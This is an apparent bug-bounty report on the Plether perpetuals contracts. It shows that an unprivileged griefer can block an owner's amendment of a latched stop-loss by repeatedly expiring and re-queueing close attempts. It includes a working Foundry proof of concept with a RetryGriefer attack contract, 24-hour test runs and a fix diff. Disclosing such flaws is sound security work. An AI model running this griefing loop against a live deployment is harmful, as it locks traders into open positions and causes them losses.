# \#98294 [SC-High] the owner's amend of a latched protection's close ceilings only works in a state any caller can keep from existing, so the documented remedy for a failing triggered close is blocked and the triggered position stays open for as long as the griefer continues

**Submitted on Nov 6th 2026 at 19:14:08 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98294
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

the fix for the prior audit's MED-9 gave TP/SL protections trader-chosen close ceilings, and added an owner-only amend as the remedy when a triggered close fails those ceilings and the protection latches. the amend only accepts a protection that is `Latched` with an empty account queue. but the protection's state is not the owner's to hold. anyone can end the live attempt by expiry, and anyone can queue the next one through the permissionless retry. a griefer who does both in one transaction every execution window means the protection is never `Latched` with an empty queue at a transaction boundary, so every amend reverts.

the owner has no other exit. a latched protection cannot be cancelled, the manual exit requires `Armed`, and an ordinary close reverts while a protection is active. the triggered position stays open with full market exposure for as long as the griefer keeps cycling. in the PoC, a 100_000 USDG position stays locked for 24 hours over 1_420 griefer cycles, at no cost beyond gas.

## Vulnerability Details

### the remedy the MED-9 fix added

the MED-9 fix (Plether-Fi/plether-core PR #124, fix commit `8a2853f8`) stores close ceilings on each protection, copies them into every triggered close and retry, and lets the owner amend them. its disposition names the amend as the way out of a latched protection: "Tight limits may prevent execution until conditions improve or the owner amends them". PR #124 describes it as "owner amendment available after relatch", and CANONICAL_ENTRYPOINTS.md documents it: "The owner may amend the close ceilings of a `Latched` protection with `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits(uint64,CloseFinancialLimits)` when the account has no pending Router order."

### the defect: the remedy is gated on a state a third party controls

the amend accepts only `Latched` with no pending order for the account (`PositionProtectionBook.sol#L315-L328`):

```solidity
    function amendLatchedPositionProtectionCloseLimits(
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external nonReentrant {
        StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
@>      if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
@>      if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }
        _setCloseLimits(protection, limits);
```

while an attempt is live the protection is `Triggered` and the account has a pending order, so both checks reject the owner. whether an attempt is live is decided by anyone, not the owner:

- the retry has no owner check. it loads the protection with `_activeProtection`, not `_ownedActiveProtection`, and queues a new attempt whenever the protection is `Latched` with an empty queue (`PositionProtectionBook.sol#L382-L394`):

```solidity
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external nonReentrant returns (uint64 linkedOrderId) {
@>      StoredProtection storage protection = _activeProtection(protectionId);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
        ...
        if (router.pendingOrderCounts(protection.account) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }
```

- the new attempt copies the stored, unamended ceilings, so it fails the same way (`OrderLiquidationBatchLogic.sol#L657-L680`):

```solidity
        PositionProtectionTypes.CloseFinancialLimits memory limits =
@>          host.positionProtectionBook().closeFinancialLimits(protectionId);
        ...
@>      request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
```

- ending the live attempt needs no oracle data and no permission. `expireOrder` only requires the deadline to have passed (`OrderRecoverySidecar.sol#L49-L64`):

```solidity
@>      if (block.timestamp <= pending.timing.executionDeadline) {
            revert OrderRouter__OrderNotExpired();
        }
```

- and every failed or expired attempt relatches the protection while the position is unchanged (`PositionProtectionBook.sol#L663-L667`):

```solidity
        retained = _positionMatches(protection);
        emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
@>      if (retained) {
@>          protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
```

`expireOrder` followed by `retryPositionProtectionClose` in one transaction moves the protection from `Triggered` to `Latched` and back to `Triggered`. "after relatch" lasts zero transactions, so the state the amend requires never exists when the owner's transaction runs.

permissionless retry itself is the documented design from PR #78, which accepted that third parties may "enqueue attempts at suboptimal times", adding "FIFO and gas pressure". that PR predates the amend, and it states that retriers "cannot alter the intent". this report is about the remedy added later by the MED-9 fix: gated as it is, any retrier can deny it for as long as it keeps cycling, so the trader's intent stays frozen at ceilings it cannot change.

the owner's other exits are closed while the protection is active:

```solidity
        // cancel: PositionProtectionBook.sol#L414-L419
        if (
@>          status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
                && status != PositionProtectionTypes.PositionProtectionStatus.Armed
        ) {
            revert OrderRouter__ProtectionNotArmed();
        }

        // manual exit (cancelPositionProtectionAndCommitClose): PositionProtectionBook.sol#L345-L348
@>      if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Armed) {
            revert OrderRouter__ProtectionNotArmed();
        }

        // ordinary commit: OrderLiquidationBatchLogic.sol#L313-L315
@>      if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
            revert OrderRouter__ProtectionActive();
        }
```

the victim state is the ordinary one the MED-9 remedy exists for. a trader sets a 2% stop-loss with a gross-debit ceiling sized for it (2_500 USDG on 100_000 notional). the price gaps through the stop to 1.04, so the triggered close needs a 4_000.00002 USDG debit and fails `GrossAccountDebit` against the 2_500 limit. the protection latches.

attack path, release parameters (60 s execution window):

1. the victim's protection is `Latched` after the failed close above. the account queue is empty.
2. in the same block, the griefer calls `retryPositionProtectionClose(protectionId)`. a new attempt with the 2_500 USDG ceiling is queued and the protection is `Triggered`.
3. the victim's `amendLatchedPositionProtectionCloseLimits` reverts `OrderRouter__ProtectionNotLatched` for the whole window. cancel and the manual exit revert `ProtectionNotArmed`, and an ordinary close reverts `ProtectionActive`.
4. in the first block after the attempt's deadline, the griefer's contract calls `OrderRouter.expireOrder(attemptId)` and then `retryPositionProtectionClose(protectionId)` in one transaction. the protection goes straight back to `Triggered`.
5. if an honest keeper executes the attempt instead, it fails the same ceiling and relatches, and the griefer back-runs it with the retry.
6. repeating step 4 every 61 s keeps the position open and unclosable.

## Impact Details

1. the victim is denied the remedy the MED-9 fix added for exactly this state. every amend reverts, a `Latched` protection cannot be cancelled, and the manual exit and an ordinary close both revert. in the PoC, all 133 owner amend attempts over a one-hour run revert, including attempts in the same block right after the griefer's transaction. over a 24-hour run, every sampled amend reverts and the position is still open after 1_420 griefer cycles.
2. the position stays open with full market exposure and its margin stays committed while the price keeps moving. in the PoC run the basket drifted from the 1.04 gap price to 1.055 during the lock, and the victim's settlement balance after the eventual close was 44_417.36 USDG, against 45_918.00 USDG when it amends and closes right after the latch: 1_500.64 USDG lower.
3. the griefer needs no capital, no bounty and no Pyth fee. expiry is unpaid, the retry carries a zero bounty, and the PoC measures about 1.07M gas per expire-and-retry cycle (1.098M maximum). at 59 cycles per hour, holding a position costs only gas.
4. any trader whose stop-loss or take-profit trips through a gap or a fast move can end up in this state, because the ceilings that latch it are the ones the trader sets to bound a triggered close.

this maps to the in-scope Medium impact "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)": the griefer gains nothing, and the victim is denied the documented remedy and left exposed for as long as the griefer continues.

## Recommendation

let the owner amend while an attempt is live. the amended ceilings then apply to the next attempt, whoever queues it, and retry stays permissionless:

```diff
     function amendLatchedPositionProtectionCloseLimits(
         uint64 protectionId,
         PositionProtectionTypes.CloseFinancialLimits calldata limits
     ) external nonReentrant {
         StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+        if (
+            protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched
+                && protection.status != PositionProtectionTypes.PositionProtectionStatus.Triggered
+        ) {
             revert OrderRouter__ProtectionNotLatched();
         }
-        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
-            revert OrderRouter__PendingOrdersExist();
-        }
         _setCloseLimits(protection, limits);
         _emitCloseLimitsUpdated(protection);
     }
```

the live attempt keeps the bounds it was committed with. once it fails or expires, the next retry copies the amended ceilings from `closeFinancialLimits`, even when the griefer is the one who queues it.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L394

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L663-L667

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L414-L419

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L345-L348

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L64

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L145-L147

https://github.com/Plether-Fi/plether-core/pull/124

https://github.com/Plether-Fi/plether-core/pull/78


## Proof of Concept

## Proof of Concept

the test deploys the repo contracts through the suite's `BasePerpTest` with the release risk parameters, and asserts the release execution fee (4 bps), frozen-close spread (50 bps) and 60 s execution window in `setUp`. only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocked. the victim's open goes through the Router queue, and the trigger, attempt execution, expiry, retry and amend are all production Router and Book entry points called by unprivileged addresses. the griefer is a small contract (`RetryGriefer.cycle`) that expires the live attempt and calls the retry in one transaction.

- `test_grieferKeepsLatchedProtectionUnamendableOverOneHour`: 67 griefer cycles over more than one hour. it mixes in honest keeper executions that fail and are back-run, tries the owner's amend twice per window, and probes cancel, the manual exit and an ordinary close.
- `test_grieferSustains24Hours`: the same loop for 24 hours. gas metering is paused because 1_420 cycles exceed forge's fixed per-test gas limit.
- `test_control_noGriefer_ownerAmendsAndCloses`: without the griefer, the owner amends right after the latch and the next attempt closes the position.

create `packages/perps/test/perps/poc/RetryBlocksAmend.t.sol` with this content:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Unprivileged griefer. One call per window: terminalise the live attempt by oracle-free expiry
///         (OrderRecoverySidecar.sol:49-64 -> relatch at PositionProtectionBook.sol:661-667), then immediately queue a
///         fresh attempt that copies the stored, unamended ceilings (PositionProtectionBook.sol:382-404; no owner check).
contract RetryGriefer {

    address internal immutable ROUTER;
    address internal immutable BOOK;

    constructor(
        address router,
        address book
    ) {
        ROUTER = router;
        BOOK = book;
    }

    function cycle(
        uint64 protectionId
    ) external returns (uint64 nextAttemptId) {
        uint64 attemptId = IPositionProtectionViews(BOOK).getPositionProtection(protectionId).linkedOrderId;
        // Ignore failure: an honest keeper may already have terminalised the attempt (it then sits Latched).
        ROUTER.call(abi.encodeWithSignature("expireOrder(uint64)", attemptId));
        nextAttemptId = IPositionProtectionActions(BOOK).retryPositionProtectionClose(protectionId);
    }

}

/// @title a permissionless expire-then-retry loop keeps a Latched protection un-amendable.
/// @dev Local deploy at a82d4fef via BasePerpTest with the DEPLOYMENT.md:128-155 release risk parameters, execution
///      fee 4 bps, frozen-close spread 50 bps and the default 60 s execution window. Only Pyth (MockPyth) and USDG
///      (MockSettlementToken) are mocked. The victim's open goes through the Router FIFO (LegacyOrderRouterHarness
///      commitOrder adapter -> production V3 commit; keeper executeOrder). Trigger, attempt execution, expiry, retry
///      and amend are production Router/Book entrypoints called by unprivileged addresses. No engine prank anywhere.
contract RetryBlocksAmendTest is BasePerpTest {

    address internal constant VICTIM = address(0xA11CE);
    address internal constant KEEPER = address(0x4EE9);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant GRIEFER_EOA = address(0xBAD);

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant STOP_LOSS = 102_000_000; // LONG loses as the basket rises (spec LONG_STOP_LOSS > mark)
    uint256 internal constant GAP_PRICE = 104_000_000; // first print after the gap, through the stop
    uint256 internal constant SIZE = 100_000e18; // 100k notional at 1.00 (multiple of positionSizeQuantum 1e20)
    uint256 internal constant MARGIN = 20_000e6;
    uint256 internal constant DEPOSIT = 50_000e6;
    uint256 internal constant DEBIT_CEILING = 2500e6; // sized for the 2% stop (~2k loss) + fees + slack

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal views;
    RetryGriefer internal griefer;

    struct Stats {
        uint256 cycles;
        uint256 ownerAmendAttempts;
        uint256 ownerAmendReverts;
        uint256 exitProbes;
        uint256 keeperFailures;
        uint256 gasTotal;
        uint256 gasMin;
        uint256 gasMax;
        uint256 latchedAt;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DEPLOYMENT.md release table.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new RetryGriefer(address(router), address(book));

        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozenCloseSpreadBps");
        assertEq(router.maxExecutionWindowSeconds(), 60, "default/release execution window");
    }

    // =====================================================================
    // Main: plain-EOA victim, >= 60 griefer cycles (> 1 h)
    // =====================================================================

    /// @notice >1 h of griefing (65 windows) with honest-keeper executions mixed in. Every owner amend reverts, the
    ///         position stays open, and cancel / manual exit / ordinary close revert throughout.
    function test_grieferKeepsLatchedProtectionUnamendableOverOneHour() public {
        _openFor(VICTIM);
        uint64 protectionId = _latch(VICTIM);
        PositionProtectionTypes.CloseFinancialLimits memory original = views.closeFinancialLimits(protectionId);
        Stats memory s;
        s.gasMin = type(uint256).max;
        s.latchedAt = vm.getBlockTimestamp();
        uint256 price = GAP_PRICE;

        // Griefer back-runs the failed keeper execution in the same block (queue empty, Latched).
        _griefCycle(s, protectionId);
        _ownerAmendReverts(s, VICTIM, protectionId);

        while (vm.getBlockTimestamp() < s.latchedAt + 1 hours + 4 minutes) {
            // Mid-window: the attempt is live, so the protection is Triggered. Owner's amend reverts.
            vm.warp(vm.getBlockTimestamp() + 30);
            vm.roll(vm.getBlockNumber() + 1);
            _ownerAmendReverts(s, VICTIM, protectionId);
            if (s.cycles % 20 == 0) {
                _assertOtherExitsFail(s, VICTIM, protectionId);
            }

            if (s.cycles % 10 == 0) {
                // An honest keeper executes the live attempt at the drifting price: it fails the trader's
                // ceiling (terminal ConstraintViolation -> relatch). The griefer back-runs in the same block.
                price += 250_000; // +0.25% per ~10 min
                _keeperExecutesAndFails(_linked(protectionId), price);
                ++s.keeperFailures;
            } else {
                // First block after the deadline: the griefer's tx lands first.
                _warpPastDeadline(_linked(protectionId));
            }
            _griefCycle(s, protectionId);
            // The owner's amend lands right after the griefer's tx in the same block.
            _ownerAmendReverts(s, VICTIM, protectionId);
        }
        uint256 duration = vm.getBlockTimestamp() - s.latchedAt;
        _report("1h run (EOA victim)", s, duration);

        assertGe(s.cycles, 60, ">= 60 griefer cycles");
        assertGe(duration, 1 hours, "lock sustained >= 1 h");
        assertEq(s.ownerAmendReverts, s.ownerAmendAttempts, "every owner amend reverted");
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        assertEq(size, SIZE, "position still open");
        _assertLimitsEq(views.closeFinancialLimits(protectionId), original);

        // Griefer stops: the owner can now amend and close, but at the drifted price.
        uint256 balanceAfter = _ownerEscapesAndCloses(VICTIM, protectionId, price);
        console2.log("final price (1e8)", price);
        console2.log("victim settlement balance after late close", balanceAfter);
    }

    /// @notice Same loop for 24 h, expiry only. Shows the >= 24 h threshold is reachable at gas cost only.
    /// @dev ~1,417 cycles x ~1.07M gas exceed forge's fixed per-test gas limit (2^30), so gas metering is paused for
    ///      this duration-only test. Per-cycle gas is measured with metering on in the 1 h test.
    function test_grieferSustains24Hours() public {
        _openFor(VICTIM);
        uint64 protectionId = _latch(VICTIM);
        PositionProtectionTypes.CloseFinancialLimits memory original = views.closeFinancialLimits(protectionId);
        Stats memory s;
        s.latchedAt = vm.getBlockTimestamp();
        vm.pauseGasMetering();
        vm.prank(GRIEFER_EOA);
        griefer.cycle(protectionId);
        ++s.cycles;
        while (vm.getBlockTimestamp() < s.latchedAt + 24 hours + 2 minutes) {
            _warpPastDeadline(_linked(protectionId));
            vm.prank(GRIEFER_EOA);
            griefer.cycle(protectionId);
            ++s.cycles;
            if (s.cycles % 60 == 0) {
                _ownerAmendReverts(s, VICTIM, protectionId);
            }
        }
        vm.resumeGasMetering();
        uint256 duration = vm.getBlockTimestamp() - s.latchedAt;
        console2.log("===== 24h run (EOA victim) =====");
        console2.log("griefer cycles", s.cycles);
        console2.log("duration (s)", duration);
        console2.log("sampled owner amend attempts / reverts", s.ownerAmendAttempts, s.ownerAmendReverts);
        assertGe(duration, 24 hours, "lock sustained >= 24 h");
        assertEq(s.ownerAmendReverts, s.ownerAmendAttempts, "every sampled owner amend reverted");
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        assertEq(size, SIZE, "position still open after 24 h");
        _assertLimitsEq(views.closeFinancialLimits(protectionId), original);
    }

    // =====================================================================
    // Negative control
    // =====================================================================

    /// @notice No griefer: right after the latch the owner amends and the next attempt closes the position.
    function test_control_noGriefer_ownerAmendsAndCloses() public {
        _openFor(VICTIM);
        _startRecordingLogs();
        uint64 protectionId = _latch(VICTIM);
        // The failed triggered close was rejected by the trader's own gross-debit ceiling (realistic victim state).
        OrderV3Types.OrderReceipt memory receipt =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), _linked(protectionId));
        assertEq(uint8(receipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.GrossAccountDebit), "ceiling");
        assertEq(receipt.failure.limit, DEBIT_CEILING, "limit");
        console2.log("first attempt: gross account debit actual / limit", receipt.failure.actual, receipt.failure.limit);
        uint256 balanceAfter = _ownerEscapesAndCloses(VICTIM, protectionId, GAP_PRICE);
        console2.log("control: victim settlement balance after close at gap price", balanceAfter);
        (uint256 size,,,,,,) = engine.positions(VICTIM);
        assertEq(size, 0, "control closes");
    }

    // =====================================================================
    // Scenario pieces
    // =====================================================================

    function _openFor(
        address account
    ) internal {
        _fundTrader(account, DEPOSIT);
        _tick();
        vm.prank(account);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, SIZE, MARGIN, 0, false);
        bytes[] memory data = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "open executed");
    }

    /// @dev Victim arms a stop-loss with a gross-debit ceiling sized for the stop; the price gaps through it, the
    ///      triggered close fails the ceiling, and the protection latches with an empty account queue.
    function _latch(
        address account
    ) internal returns (uint64 protectionId) {
        _refreshMark(ENTRY_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: DEBIT_CEILING,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(account);
        protectionId = book.createPositionProtection(params);

        _mockPythUpdateData(GAP_PRICE);
        bytes[] memory data = _livePriceData(GAP_PRICE);
        vm.prank(TRIGGER_KEEPER);
        uint64 attemptId = book.triggerPositionProtection(protectionId, data);

        _keeperExecutesAndFails(attemptId, GAP_PRICE);
        assertEq(
            uint8(views.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "protection latched"
        );
        assertEq(router.pendingOrderCounts(account), 0, "no live attempt after the failed close");
    }

    function _griefCycle(
        Stats memory s,
        uint64 protectionId
    ) internal {
        _coolAll();
        vm.prank(GRIEFER_EOA);
        uint256 g = gasleft();
        griefer.cycle(protectionId);
        uint256 used = g - gasleft();
        s.gasTotal += used;
        if (used > s.gasMax) {
            s.gasMax = used;
        }
        if (used < s.gasMin) {
            s.gasMin = used;
        }
        ++s.cycles;
        assertEq(
            uint8(views.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "griefer re-queued an attempt"
        );
    }

    function _ownerAmendReverts(
        Stats memory s,
        address owner,
        uint64 protectionId
    ) internal {
        ++s.ownerAmendAttempts;
        vm.prank(owner);
        try book.amendLatchedPositionProtectionCloseLimits(protectionId, _openLimits()) {
            revert("owner amend unexpectedly succeeded");
        } catch (bytes memory ret) {
            // Attempt live -> status Triggered -> PositionProtectionBook.sol:320-321 fires before the :323 gate.
            assertEq(bytes4(ret), IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector, "amend selector");
            ++s.ownerAmendReverts;
        }
    }

    function _assertOtherExitsFail(
        Stats memory s,
        address owner,
        uint64 protectionId
    ) internal {
        ++s.exitProbes;
        // Cancel: only PendingOpen/Armed (PositionProtectionBook.sol:414-419).
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(protectionId);
        // Manual exit: needs Armed (PositionProtectionBook.sol:346-348).
        OrderV3Types.OrderRequest memory req;
        req.side = CfdTypes.Side.LONG;
        req.sizeDelta = SIZE;
        req.isClose = true;
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(protectionId, req);
        // Ordinary close through the Router: ProtectionActive (router/OrderLiquidationBatchLogic.sol:313-315).
        vm.prank(owner);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
    }

    function _keeperExecutesAndFails(
        uint64 attemptId,
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attemptId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt fails");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "fails the trader's gross-debit ceiling"
        );
    }

    function _executeAttempt(
        uint64 attemptId,
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attemptId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "attempt executes");
    }

    /// @dev Griefer stopped: expire the live attempt if any, amend, retry, execute. Returns settlement balance.
    function _ownerEscapesAndCloses(
        address owner,
        uint64 protectionId,
        uint256 price
    ) internal returns (uint256 balanceAfter) {
        if (router.pendingOrderCounts(owner) != 0) {
            _warpPastDeadline(_linked(protectionId));
            vm.prank(KEEPER);
            router.expireOrder(_linked(protectionId));
        }
        vm.prank(owner);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _openLimits());
        vm.prank(KEEPER);
        uint64 retryId = book.retryPositionProtectionClose(protectionId);
        _executeAttempt(retryId, price);
        (uint256 size,,,,,,) = engine.positions(owner);
        assertEq(size, 0, "closed after amend");
        balanceAfter = clearinghouse.balanceAssets(owner);
    }

    // =====================================================================
    // Helpers
    // =====================================================================

    function _linked(
        uint64 protectionId
    ) internal view returns (uint64) {
        return views.getPositionProtection(protectionId).linkedOrderId;
    }

    function _openLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _assertLimitsEq(
        PositionProtectionTypes.CloseFinancialLimits memory a,
        PositionProtectionTypes.CloseFinancialLimits memory b
    ) internal pure {
        assertEq(a.maxExecutionNotionalAssets, b.maxExecutionNotionalAssets, "notional ceiling");
        assertEq(a.maxGrossAccountDebitAssets, b.maxGrossAccountDebitAssets, "gross debit ceiling");
        assertEq(a.maxActionChargeAssets, b.maxActionChargeAssets, "action charge ceiling");
        assertEq(a.maxExplicitFeesAssets, b.maxExplicitFeesAssets, "explicit fees ceiling");
    }

    /// @dev Next block whose timestamp is strictly past the attempt's execution deadline (OrderRecoverySidecar:57).
    function _warpPastDeadline(
        uint64 attemptId
    ) internal {
        uint256 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
        if (vm.getBlockTimestamp() <= deadline) {
            vm.warp(deadline + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Approximate per-transaction cold access: mark every touched contract's storage cold before a cycle.
    function _coolAll() internal {
        vm.cool(address(router));
        vm.cool(address(router.lifecycleBook()));
        vm.cool(address(book));
        vm.cool(address(clearinghouse));
        vm.cool(address(engine));
        vm.cool(address(pool));
        vm.cool(address(pletherOracle));
        vm.cool(address(orderExecutionSidecar));
        vm.cool(address(policyEvaluator));
        vm.cool(address(griefer));
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _report(
        string memory label,
        Stats memory s,
        uint256 duration
    ) internal pure {
        console2.log("=====", label, "=====");
        console2.log("griefer cycles", s.cycles);
        console2.log("duration (s)", duration);
        console2.log("owner amend attempts / reverts", s.ownerAmendAttempts, s.ownerAmendReverts);
        console2.log("other-exit probes (cancel, manual exit, ordinary close all reverted)", s.exitProbes);
        console2.log("honest-keeper failed executions back-run by griefer", s.keeperFailures);
        console2.log("griefer cycle exec gas (cooled) min / avg / max", s.gasMin, s.gasTotal / s.cycles, s.gasMax);
    }

}
```

run it from `packages/perps`:

```bash
forge test --match-path test/perps/poc/RetryBlocksAmend.t.sol -vv
```

output:

```bash
Ran 3 tests for test/perps/poc/RetryBlocksAmend.t.sol:RetryBlocksAmendTest
[PASS] test_control_noGriefer_ownerAmendsAndCloses() (gas: 6460268)
Logs:
  first attempt: gross account debit actual / limit 4000000020 2500000000
  control: victim settlement balance after close at gap price 45917999960
[PASS] test_grieferKeepsLatchedProtectionUnamendableOverOneHour() (gas: 68916772)
Logs:
  ===== 1h run (EOA victim) =====
  griefer cycles 67
  duration (s) 3846
  owner amend attempts / reverts 133 133
  other-exit probes (cancel, manual exit, ordinary close all reverted) 3
  honest-keeper failed executions back-run by griefer 6
  griefer cycle exec gas (cooled) min / avg / max 804142 1065141 1097966
  final price (1e8) 105500000
  victim settlement balance after late close 44417360221
[PASS] test_grieferSustains24Hours() (gas: 4529687)
Logs:
  ===== 24h run (EOA victim) =====
  griefer cycles 1420
  duration (s) 86559
  sampled owner amend attempts / reverts 23 23
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.13s (1.20s CPU time)
```

